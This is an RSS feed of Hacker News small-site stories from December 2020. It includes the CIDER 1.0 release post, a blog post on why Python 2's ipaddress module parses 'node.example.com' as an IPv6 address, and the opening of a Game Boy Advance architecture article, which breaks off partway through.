<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 5]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 5. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Thu, 31 Dec 2020 12:53:16 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-5.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Thu, 31 Dec 2020 12:53:16 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Cider 1.0]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25568181">thread link</a>) | @rayxi271828
<br/>
December 29, 2020 | https://metaredux.com/posts/2020/12/28/cider-1-0.html | <a href="https://web.archive.org/web/*/https://metaredux.com/posts/2020/12/28/cider-1-0.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <blockquote>
  <p>You can‚Äôt really know where you are going until you know where you have been.</p>

  <p>‚Äì Maya Angelou</p>
</blockquote>

<p><a href="https://cider.mx/">CIDER</a> started its life as an effort to replace a
hacked version of SLIME<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> with a proper environment for Clojure
development on Emacs. Many of you probably don‚Äôt remember those days,
but initially almost everyone was using a modified version of SLIME
for Clojure development, as there weren‚Äôt many (any?) alternatives
back in the day. The creation of CIDER was fueled mostly by the advent of
<a href="https://nrepl.org/">nREPL</a>, which was the first project that aimed to
provide a common tool-agnostic foundation for Clojure development
tools, and by the desire to address the impedance mismatch between
SLIME and Clojure.</p>

<p>CIDER was started in spring 2012 (under the name <code>nrepl.el</code>) by Phil
Hagelberg (of Leiningen fame), who hacked a prototype of an nREPL
client in Emacs Lisp on a flight to San Francisco. He got a bit stuck
on the socket-based bencode functionality and dropped it after the
flight, but not before pushing the code out and mentioning it on the
<a href="http://groups.google.com/group/clojure/browse_thread/thread/2bd91de7dca55ca4">Clojure mailing
list</a>.
What followed is the best example of the power of open-source software‚Ä¶</p>

<p>Tim King came across Phil‚Äôs post, picked <code>nrepl.el</code> back up, and it quickly became
a respectable competitor to SLIME. The project evolved at a rapid pace
and eventually superseded SLIME in August 2012.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Unfortunately in
early 2013 Tim ran out of time for nrepl.el and after another period of
stagnation, handed it over to me, as I was the main
contributor to <code>nrepl.el</code> besides him back then. I have been the project‚Äôs
steward ever since. Third time‚Äôs a charm, right?</p>

<p>My tenure at the helm started with a bit of
controversy as I renamed nrepl.el to CIDER in version 0.3 to avoid the
common case of confusion between the nREPL server and the <code>nrepl</code>
package for Emacs.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> If I have to be completely honest - I also
wanted the project to have a name as cool as SLIME, and I‚Äôm fairly
certain I succeeded in that regard.</p>

<p>Eventually CIDER became one of the most popular development
environments in the Clojure community and it spawned many important
projects (e.g. <code>cider-nrepl</code> and <code>orchard</code>), that are widely
used by other development tools (e.g. <code>vim-fireplace</code>, Conjure, <code>iced-vim</code> and Calva). My work on CIDER also led to me
becoming the maintainer of nREPL and restarting its development
after a long period of hibernation. In hindsight probably the work
I did on nREPL was even more important than the work I did on CIDER.</p>

<p>Over the years a big ecosystem of packages grew around CIDER and nREPL
and they became important parts of the Clojure development
tooling. Today CIDER and nREPL face a lot of competition, but they are still
evolving at a steady pace, occasionally innovating, and serving as inspiration for
other tools. That makes me proud of the work we‚Äôve done over the past 8 and a half years,
even if fewer and fewer people are using CIDER and Emacs every year.</p>

<p>One thing that constantly eluded me, however, was a 1.0 release. I
guess I‚Äôm the one to blame for this not happening sooner, as I had
some really grand ambitions for CIDER 1.0 (and some rather high
quality standards to go with them) and I was optimistic that somehow my plans would
become a reality in a reasonable amount of time.  Clearly I was
mistaken. Between me having to split my time between a dozen OSS projects
and most of them currently having no other active maintainers but me,
it eventually became obvious that the grand plans will have to wait
for CIDER 2.0. Grand plans and ambitions for world domination aside,
CIDER has been pretty stable for a while now and it seems to get the
job done. And there‚Äôs also the theory that if a piece of software has
some (happy) users then it qualifies for a 1.0 release‚Ä¶ Oh, well‚Ä¶</p>

<p>Today the long wait is over - <a href="https://github.com/clojure-emacs/cider/releases/tag/v1.0.0">CIDER 1.0
(‚ÄúSofia‚Äù)</a>
is officially out!<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>  There‚Äôs nothing particularly interesting in this
release - it‚Äôs almost the same as CIDER 0.26. If you notice one
difference, it would probably be that commands that act on the symbol
at point (e.g. <code>cider-doc</code>) will no longer prompt you to confirm the
symbol. The old default was a mistake and I decided to adjust it for
this grand release. If you notice another difference, it‚Äôd probably be
that CIDER is officially using SemVer now. I still have to define
what exactly is going to constitute a breaking change going forward (e.g.
are changes to keybindings breaking changes?), but I‚Äôm reasonably
sure the adherence to SemVer will make CIDER upgrades less painful
for everyone.</p>

<p>There are many things that prompted me to do the 1.0 release now, but
probably the most important factor was that 2020 was such a horrible
year for all of us. I felt we needed all the good news we could
get to counter all the pain and suffering we‚Äôve had to endure. While I
can‚Äôt help the fight against the pandemic, I hope I can cheer you up a
bit, by delivering another iteration of your favorite software that rocks.</p>

<p>So, what‚Äôs next? I don‚Äôt really have any particular plans for CIDER 1.1, so we‚Äôll see how exactly it‚Äôs
going to shape up. Some vague ideas that have been floating in my mind are proper support for sideloading,
adding support for dynamic middleware loading, and improvements to the session management. No promises, though.
I‚Äôm also aiming to finally do an nREPL 1.0 release at some point. There are plenty of tickets
marked with the label ‚ÄúGood First Issue‚Äù on CIDER‚Äôs issue tracker, so if you‚Äôre looking for
more fun challenges after the end of the ‚ÄúAdvent of Code‚Äù be my guest. I can definitely use all the help
I can get.</p>

<p>One thing is certain, though - CIDER will always stay true to its guiding principles:</p>

<ul>
  <li>REPL-first (as opposed to relying on static code analysis)</li>
  <li>Community-first (CIDER is defined by its community)</li>
  <li>Keep on rocking in a Lisp world!</li>
</ul>

<p>I‚Äôm writing this article while enjoying a bottle of proper (hard) French cider, so I think
I should wrap it up before I start enjoying myself too much.
Thanks to everyone who has been a part of CIDER‚Äôs community over the years! Thanks to everyone who has contributed to the project and supported it! Thanks
to everyone who still loves Emacs and CIDER! This release is for all of you!
Cheers!</p>



  </div></div>]]>
            </description>
            <link>https://metaredux.com/posts/2020/12/28/cider-1-0.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568181</guid>
            <pubDate>Tue, 29 Dec 2020 09:33:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Node.example.com Is an IP Address]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25565443">thread link</a>) | @nfrmatk
<br/>
December 28, 2020 | https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/ | <a href="https://web.archive.org/web/*/https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <main>
      
  <article>  
    
    <p>2020-12-28</p>
    
<p>Hello! Welcome to the once-yearly blog post! This year I'd like to examine the
most peculiar bug I encountered at work. To set the stage, let's start with a
little background. üìö</p>
<p>When we write <a href="https://en.wikipedia.org/wiki/URL">URLs</a> with a <a href="https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers">non-standard</a> <a href="https://en.wikipedia.org/wiki/Port_(computer_networking)">port</a> we
specify the port after a <code>:</code>. With <a href="https://en.wikipedia.org/wiki/Hostname">hostnames</a> and <a href="https://en.wikipedia.org/wiki/IPv4#Addressing">IPv4</a> addresses
this is straightforward. Here's some <a href="https://www.python.org/">Python</a> code to show how easy it is.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(</span><span>"https://node.example.com:8000"</span><span>)
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'node.example.com'</span><span>, </span><span>8000</span><span>)
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(</span><span>"https://192.168.0.1:8000"</span><span>)
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'192.168.0.1'</span><span>, </span><span>8000</span><span>)
</span></code></pre>
<p>Unfortunately, when <a href="https://en.wikipedia.org/wiki/IPv6#Addressing">IPv6</a> addresses are involved some ambiguity is introduced.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(
</span><span>...     </span><span>"https://fdc8:bf8b:e62c:abcd:1111:2222:3333:4444:8000"
</span><span>... )
</span><span>...
</span><span>&gt;&gt;&gt; </span><span>url.hostname
</span><span>'fdc8'
</span><span>&gt;&gt;&gt; </span><span>try</span><span>:
</span><span>...     </span><span>url.port
</span><span>... </span><span>except </span><span>ValueError </span><span>as </span><span>error:
</span><span>...     </span><span>print</span><span>(error)
</span><span>...
Port could </span><span>not </span><span>be cast to integer value </span><span>as</span><span> </span><span>'bf8b:e62c:abcd:1111:2222:3333:4444:8000'
</span></code></pre>
<p>Since IPv6 addresses use a "colon-hex" format with <a href="https://en.wikipedia.org/wiki/Hexadecimal">hexadecimal</a> fields
separated by <code>:</code> we can't tell a port apart from a normal field. Notice in the
example above that the hostname is truncated after the first <code>:</code>, not the one
just before <code>8000</code>.</p>
<p>Fortunately, the spec for URLs recognizes this ambiguity and gives us a way to
handle it. <a href="https://www.ietf.org/rfc/rfc2732.txt">RFC 2732 (<em>Format for Literal IPv6 Addresses in URL's</em>)</a>
says</p>
<blockquote>
<p>To use a literal IPv6 address in a URL, the literal address should be
enclosed in "[" and "]" characters.</p>
</blockquote>
<p>Update our example above to include <code>[</code> and <code>]</code> and voil√†! It just works.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(
</span><span>...     </span><span>"https://[fdc8:bf8b:e62c:abcd:1111:2222:3333:4444]:8000"
</span><span>... )
</span><span>...
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'fdc8:bf8b:e62c:abcd:1111:2222:3333:4444'</span><span>, </span><span>8000</span><span>)
</span></code></pre>
<p>Armed with that knowledge we can dive into the problem. ü§ø</p>

<p>A few months ago a co-worker of mine wrote a seemingly innocuous function.</p>
<pre><code><span>from </span><span>ipaddress </span><span>import </span><span>ip_address


</span><span>def </span><span>safe_host</span><span>(</span><span>host</span><span>): 
    </span><span>"""Surround `host` with brackets if it is an IPv6 address."""
    </span><span>try</span><span>:
        </span><span>if </span><span>ip_address(host)</span><span>.version </span><span>== </span><span>6</span><span>:
            </span><span>return </span><span>"[</span><span>{}</span><span>]"</span><span>.format(host)
    </span><span>except </span><span>ValueError</span><span>:
        </span><span>pass
    return </span><span>host
</span></code></pre>
<p>Elsewhere in the code it was invoked something like this, so that hostnames,
IPv4 addresses, and IPv6 addresses could all be safely interpolated.</p>
<pre><code><span>url </span><span>= </span><span>"https://</span><span>{host}</span><span>:8000/some/path/"</span><span>.format(host</span><span>=</span><span>safe_host(host))
</span></code></pre>
<p>Since my co-worker is awesome they wrote tests to validate their code. ‚úÖ</p>
<pre><code><span>def </span><span>test_safe_host_with_hostname</span><span>():
    </span><span>"""Hostnames should be unchanged."""
    </span><span>assert </span><span>safe_host(</span><span>"node.example.com"</span><span>) </span><span>== </span><span>"node.example.com"


</span><span>def </span><span>test_safe_host_with_ipv4_address</span><span>():
    </span><span>"""IPv4 addresses should be unchanged."""
    </span><span>assert </span><span>safe_host(</span><span>"192.168.0.1"</span><span>) </span><span>== </span><span>"192.168.0.1"


</span><span>def </span><span>test_safe_host_with_ipv6_address</span><span>():
    </span><span>"""IPv6 addresses should be surrounded by brackets."""
    </span><span>assert </span><span>(
        </span><span>safe_host(</span><span>"fdc8:bf8b:e62c:abcd:1111:2222:3333:4444"</span><span>)
        </span><span>== </span><span>"[fdc8:bf8b:e62c:abcd:1111:2222:3333:4444]"
    </span><span>)
</span></code></pre>
<p>Thank goodness they did. The Python 2 tests failed (<a href="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/#drop-python2">don't look at me like
that</a> üòí).</p>
<pre><code><span>‚úñ </span><span>FAIL</span><span> py27 in </span><span>1</span><span>.</span><span>83</span><span> seconds
‚úî </span><span>OK</span><span> py36 in </span><span>2</span><span>.</span><span>82</span><span> seconds
‚úî </span><span>OK</span><span> py37 in </span><span>2</span><span>.</span><span>621</span><span> seconds
‚úî </span><span>OK</span><span> py38 in </span><span>2</span><span>.</span><span>524</span><span> seconds
‚úî </span><span>OK</span><span> py39 in </span><span>2</span><span>.</span><span>461</span><span> seconds
</span></code></pre>
<p>Both the hostname and IPv6 address tests failed. But <em><strong>why</strong></em> did they fail?
And why did the Python 3 tests pass? ü§î</p>
<p>We'll start with the hostname failure and try to isolate the bug.</p>
<pre><code><span>E       </span><span>AssertionError</span><span>: </span><span>assert </span><span>'[node.example.com]' </span><span>== </span><span>'node.example.com'
</span><span>E         </span><span>- </span><span>[node.example.com]
E         ? </span><span>-                -
</span><span>E         </span><span>+ </span><span>node.example.com
</span></code></pre>
<p>The failure says <code>node.example.com</code> was surrounded by brackets, but that's
only supposed to happen for IPv6 addresses! Let's crack open a Python 2
interpreter for a quick sanity check.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)</span><span>.version
</span><span>6
</span></code></pre><img src="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/confused-jeff-bridges.webp" alt="Confused Jeff Bridges">

<p>If, like Jeff Bridges, you were confused by that result, <em>relax</em>. We're
probably not in a <a href="https://en.wikipedia.org/wiki/Bizarro_World">Bizarro World</a> where <code>node.example.com</code> is a valid IPv6
address. There must be an explanation for this behavior.</p>
<p>Things start to become a little more clear when we see the result of the
<a href="https://github.com/python/cpython/blob/v3.9.0/Lib/ipaddress.py#L27-L54"><code>ip_address()</code></a> function for ourselves.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)
IPv6Address(</span><span>u</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'</span><span>)
</span></code></pre>
<p>At first glance that looks like madness. Python 3 behaves in an entirely
different manner.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>try</span><span>:
</span><span>...     </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)
</span><span>... </span><span>except </span><span>ValueError </span><span>as </span><span>error:
</span><span>...     </span><span>print</span><span>(error)
</span><span>... 
</span><span>'node.example.com' </span><span>does </span><span>not </span><span>appear to be an IPv4 </span><span>or </span><span>IPv6 address
</span></code></pre>
<p>Python 3 knows that's not an IPv6 address, so why doesn't Python 2? The answer
is in how differently the two Python versions handle text.</p>

<p>Computers don't operate on text as humans think of it. They operate on numbers.
That's part of why we have IP addresses to begin with. In order to represent
human-readable text with computers we had to assign meaning to the numbers.
Thus, <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a> was born.</p>
<p>ASCII is a <a href="https://en.wikipedia.org/wiki/Character_encoding">character encoding</a>, which means it specifies how to interpret
<a href="https://en.wikipedia.org/wiki/Byte">bytes</a> as text we understand (provided you speak English). So, when your
computer sees <code>01101110</code> in <a href="https://en.wikipedia.org/wiki/Binary_number">binary</a> (<code>110</code> in <a href="https://en.wikipedia.org/wiki/Decimal">decimal</a>) you see <code>n</code> because
that's what ASCII says it is.</p>
<p>You can see the number to text conversion in action right in the Python
interpreter.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ord</span><span>(</span><span>"n"</span><span>)
</span><span>110
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>110</span><span>)
</span><span>'n'
</span></code></pre>
<p>In fact, it doesn't matter what numbering system you use. If you specify
binary, <a href="https://en.wikipedia.org/wiki/Octal">octal</a>, decimal, hexadecimal, whatever... If it can be understood as
the right integer it will be displayed correctly.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0b01101110</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0o156</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>110</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0x6e</span><span>)
</span><span>'n'
</span></code></pre>
<p>Neat, but what does that information do for us?</p>

<p>Just for giggles, humor me and let's look at the character-number translations
for <code>node.example.com</code>. We'll leave out binary and octal, because they make
this table uglier than it already is.</p>
<table>
  <tbody><tr>
    <th>Character</th>
    <td>n</td>
    <td>o</td>
    <td>d</td>
    <td>e</td>
    <td>.</td>
    <td>e</td>
    <td>x</td>
    <td>a</td>
    <td>m</td>
    <td>p</td>
    <td>l</td>
    <td>e</td>
    <td>.</td>
    <td>c</td>
    <td>o</td>
    <td>m</td>
  </tr>
  <tr>
    <th>Decimal</th>
    <td>110</td>
    <td>111</td>
    <td>100</td>
    <td>101</td>
    <td>46</td>
    <td>101</td>
    <td>120</td>
    <td>97</td>
    <td>109</td>
    <td>112</td>
    <td>108</td>
    <td>101</td>
    <td>46</td>
    <td>99</td>
    <td>111</td>
    <td>109</td>
  </tr>
  <tr>
    <th>Hexadecimal</th>
    <td>6e</td>
    <td>6f</td>
    <td>64</td>
    <td>65</td>
    <td>2e</td>
    <td>65</td>
    <td>78</td>
    <td>61</td>
    <td>6d</td>
    <td>70</td>
    <td>6c</td>
    <td>65</td>
    <td>2e</td>
    <td>63</td>
    <td>6f</td>
    <td>6d</td>
  </tr>
</tbody></table>
<p>Hey, hold on a second... If you tilt your head sideways and squint that last
row looks kinda like an IPv6 address, doesn't it?</p>
<p>We should verify, just to be absolutely certain. You've still got that Python 2
interpreter open, right?</p>
<pre><code><span>&gt;&gt;&gt; </span><span># Convert the characters in the hostname to hexadecimal.
</span><span>&gt;&gt;&gt; </span><span>hostname </span><span>= </span><span>"node.example.com"
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal </span><span>= </span><span>""</span><span>.join(</span><span>hex</span><span>(</span><span>ord</span><span>(c))[</span><span>2</span><span>:] </span><span>for </span><span>c </span><span>in </span><span>hostname)
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal
</span><span>'6e6f64652e6578616d706c652e636f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Convert the "IP address" to text.
</span><span>&gt;&gt;&gt; </span><span>address </span><span>= </span><span>ipaddress.ip_address(hostname)
</span><span>&gt;&gt;&gt; </span><span>str</span><span>(address)
</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Remove the colons from that text.
</span><span>&gt;&gt;&gt; </span><span>address_without_colons </span><span>= </span><span>str</span><span>(address).replace(</span><span>":"</span><span>, </span><span>""</span><span>)
</span><span>&gt;&gt;&gt; </span><span>address_without_colons
</span><span>'6e6f64652e6578616d706c652e636f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Compare the results and see they're equal.
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal </span><span>== </span><span>address_without_colons
</span><span>True
</span></code></pre>
<p>Sure enough, when you boil them both down to numbers they're the same mess of
hexadecimal.</p>

<p>If we dig into the source code for the Python 2 version of the
<a href="https://github.com/phihag/ipaddress/blob/v1.0.23/ipaddress.py"><code>ipaddress</code></a> module we ultimately come to a
<a href="https://github.com/phihag/ipaddress/blob/v1.0.23/ipaddress.py#L2026-L2031">curious set of lines</a>.</p>
<pre><code><span># Constructing from a packed address
</span><span>if </span><span>isinstance</span><span>(address, </span><span>bytes</span><span>)</span><span>:
    </span><span>self._check_packed_address(address, </span><span>16</span><span>)
    </span><span>bvs </span><span>= </span><span>_compat_bytes_to_byte_vals(address)
    self</span><span>._ip </span><span>= </span><span>_compat_int_from_byte_vals(bvs, </span><span>'big'</span><span>)
    </span><span>return
</span></code></pre>
<p>It turns out that, under certain conditions, the <code>ipaddress</code> module can create
IPv6 addresses from raw bytes. My assumption is that it offers this behavior as
a convenient way to parse IP addresses from data fresh off the <a href="https://en.wikipedia.org/wiki/Wire_data">wire</a>.</p>
<p>Does <code>node.example.com</code> meet those certain conditions? You bet it does. Because
we're using Python 2 it's just <code>bytes</code> and it happens to be 16 characters long.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>isinstance</span><span>(</span><span>"node.example.com"</span><span>, </span><span>bytes</span><span>)
</span><span>True
</span><span>&gt;&gt;&gt; </span><span># `self._check_packed_address` basically just checks how long it is.
</span><span>&gt;&gt;&gt; </span><span>len</span><span>(</span><span>"node.example.com"</span><span>) </span><span>== </span><span>16
True
</span></code></pre>
<p>The rest of the <code>ipaddress</code> lines say to interpret the sequence of bytes as a
<a href="https://en.wikipedia.org/wiki/Endianness">big-endian</a> integer. That's <a href="https://docs.python.org/3.9/library/struct.html#struct.unpack">magic</a> best left
for another blog post, but the gist is that hexadecimal interpretation of
<code>node.example.com</code> is condensed into a single, <strong>huge</strong> number.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>int</span><span>(</span><span>"6e6f64652e6578616d706c652e636f6d"</span><span>, </span><span>16</span><span>)
</span><span>146793460745001871434687145741037825901</span><span>L
</span></code></pre>
<p>That's an absolutely massive number, but not so massive it won't fit within the
<a href="https://en.wikipedia.org/wiki/IPv6#Larger_address_space">IPv6 address space</a>.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ip_address(</span><span>146793460745001871434687145741037825901</span><span>L</span><span>)
IPv6Address(</span><span>u</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'</span><span>)
</span></code></pre>
<p>As it turns out, if you're liberal in your interpretation, <code>node.example.com</code>
<em>can</em> be an IPv6 address!</p>

<p>Obviously that's hogwash. Bizarro might be proud, but that's not what we wanted
to happen.</p>
<p>There's a quote about numbers which is apocryphally attributed to <a href="https://en.wikipedia.org/wiki/W._E._B._Du_Bois">W.E.B. Du
Bois</a>, but that actually comes from <a href="https://en.wikipedia.org/wiki/Harold_Geneen">Harold Geneen</a>'s book,
<a href="https://en.wikiquote.org/wiki/Harold_Geneen"><em>Managing</em></a>.</p>
<blockquote>
<p>When you have mastered the numbers, you will in fact no longer be reading
numbers, any more than you read words when reading a book. You will be
reading meanings.</p>
</blockquote>
<p>Having not read the book I'm probably taking the quote way out of context, but
I think it fits our situation well.</p>
<p>As we've seen above, we can freely convert characters to numbers and back
again. The root of our problem is that when we use Python 2 it considers text
to be bytes. There's not a deeper, inherent meaning. Maybe the bytes are meant
to be ASCII, maybe they're meant to be a long number, maybe they're meant to be
an IP address. The interpretation of those bytes is up to us.</p>
<p>Python 2 doesn't differentiate between bytes and text by default. In fact, the
<code>bytes</code> type is just an <a href="https://docs.python.org/3/whatsnew/2.6.html#pep-3112-byte-literals">alias</a> for <code>str</code>.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>bytes
</span><span>&lt;</span><span>type </span><span>'str'</span><span>&gt;
&gt;&gt;&gt; </span><span>bytes </span><span>is </span><span>str
</span><span>True
</span></code></pre>
<p>To make that even more concrete, see how Python 2 considers <code>n</code> to be the same
as this sequence of raw bytes.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>"n" </span><span>== </span><span>b</span><span>"\x6e"
</span><span>True
</span></code></pre>
<p>Our Python 2 code doesn't work the way we want it to because raw bytes can have
arbitrary meaning and we haven't told it to use our intended meaning.</p>
<p>So now we know why Python 2 interprets <code>node.example.com</code> as an IPv6 address,
but why does Python 3 behave differently? More importantly, how can we
reconcile the two?</p>

<p>ASCII looked like a good idea in the 1960's. With decades of hindsight we
know the 256 characters ‚Ä¶</p></article></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/">https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/</a></em></p>]]>
            </description>
            <link>https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25565443</guid>
            <pubDate>Tue, 29 Dec 2020 01:12:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner's Guide to Houseplants]]>
            </title>
            <description>
<![CDATA[
Score 101 | Comments 36 (<a href="https://news.ycombinator.com/item?id=25565349">thread link</a>) | @Pjki889
<br/>
December 28, 2020 | https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502 | <a href="https://web.archive.org/web/*/https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502</link>
            <guid isPermaLink="false">hacker-news-small-sites-25565349</guid>
            <pubDate>Tue, 29 Dec 2020 00:59:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Teaching the Unfortunate Parts]]>
            </title>
            <description>
<![CDATA[
Score 102 | Comments 69 (<a href="https://news.ycombinator.com/item?id=25564666">thread link</a>) | @gary_bernhardt
<br/>
December 28, 2020 | https://www.executeprogram.com/blog/teaching-the-unfortunate-parts | <a href="https://web.archive.org/web/*/https://www.executeprogram.com/blog/teaching-the-unfortunate-parts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.executeprogram.com/blog/teaching-the-unfortunate-parts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564666</guid>
            <pubDate>Mon, 28 Dec 2020 23:37:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Architecture of the Game Boy Advance]]>
            </title>
            <description>
<![CDATA[
Score 208 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25564619">thread link</a>) | @biwasa
<br/>
December 28, 2020 | https://www.copetti.org/writings/consoles/game-boy-advance/ | <a href="https://web.archive.org/web/*/https://www.copetti.org/writings/consoles/game-boy-advance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div class="page"><nav id="navbar"></nav><h2>A Practical Analysis</h2><hr><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>The internal design of the Game Boy Advance is quite impressive for a portable console that runs on two AA batteries.</p><p>This console will carry on using Nintendo‚Äôs <em>signature</em> GPU. Additionally, it will introduce a relatively new CPU from a UK company that will surge in popularity in years to come.</p><hr><h2 id="cpu">CPU</h2><p>Most of the components are combined into a single package called <strong>CPU AGB</strong>. This package contains two completely different CPUs:</p><ul><li>A <strong>Sharp LR35902</strong> running at either 8.4 or 4.2 MHz: <em>If it isn‚Äôt the same CPU found on the Game Boy!</em> It‚Äôs effectively used to run Game Boy (<strong>DMG</strong>) and Game Boy Color (<strong>CGB</strong>) games. Here‚Äôs <a href="https://www.copetti.org/writings/consoles/game-boy/">my previous article</a> if you want to know more about it.</li><li>An <strong>ARM7TDMI</strong> running at 16.78 MHz: This is the new processor we‚Äôll focus on, it most certainly runs Game Boy Advance games.</li></ul><p>Note that both CPUs will <strong>never run at the same time</strong> or do any fancy co-processing. The <strong>only</strong> reason for including the <em>very</em> old Sharp is for <strong>backwards compatibility</strong>.</p><h4 id="whats-new">What‚Äôs new?</h4><p>Before ARM Holdings (currently ‚ÄúArm‚Äù) became incredibly popular in the smartphone world, they licensed their CPU designs to power Acorn‚Äôs computers, Apple‚Äôs Newton, Nokia‚Äôs phones and the Panasonic 3DO.
Nintendo‚Äôs chosen CPU, the ARM7TDMI, is based on the earlier ARM710 design, and includes:</p><ul><li><strong>ARM v4</strong> ISA: The 4th version of the 32-bit ARM instruction set.</li><li><strong>Three-stage pipeline</strong>: Execution of instructions are divided into three steps or <em>stages</em>. The CPU will fetch, decode and execute up to three instructions concurrently. This enables maximum use of the CPU‚Äôs resources (which reduces idle silicon) while also increasing the amount of instructions executed per unit of time.</li><li><strong>32-bit ALU</strong>: Can operate 32-bit numbers without consuming extra cycles.</li></ul><p>Moreover, this core contains some extensions referenced in its name (<em>TDMI</em>):</p><ul><li><strong>T</strong> ‚Üí <strong>Thumb</strong>: A subset of the ARM instruction set whose instructions are encoded into 16-bit words.<ul><li>Being 16-bit, Thumb instructions require half the bus width and occupy half the memory. However, since Thumb instructions offer only a functional subset of ARM you may have to write more instructions to achieve the same effect.</li><li>Thumb only offers conditional execution on branches, its data processing ops use a two-address format, rather than three-address, and it only has access to the bottom half of the register file.</li><li>In practice Thumb uses 70% of the space of ARM code. For 16-bit wide memory Thumb runs <em>faster</em> than ARM.</li><li>If required, ARM and Thumb instructions can be mixed in the same program (called <em>interworking</em>) so developers can choose when and where to use each mode.</li></ul></li><li><strong>D</strong> ‚Üí <strong>Debug Extensions</strong>: Provide JTAG debugging.</li><li><strong>M</strong> ‚Üí <strong>Enhanced Multiplier</strong>: Previous ARM cores required multiple cycles to compute full 32-bit multiplications, this enhancement reduces it to just a few.</li><li><strong>I</strong> 